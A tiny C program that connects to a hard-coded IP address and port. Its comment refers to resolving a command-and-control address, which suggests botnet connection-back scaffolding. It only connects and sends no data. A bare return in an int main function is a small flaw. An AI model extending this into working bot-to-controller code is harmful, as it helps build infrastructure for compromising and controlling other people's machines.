#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>


int main()
{

    struct sockaddr_in srv_addr;
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr =inet_addr("210.117.181.86");
    srv_addr.sin_port = htons(20226);
    int fd_serv = -1;
    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        return;
    }


    // Should call resolve_cnc_addr


    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}
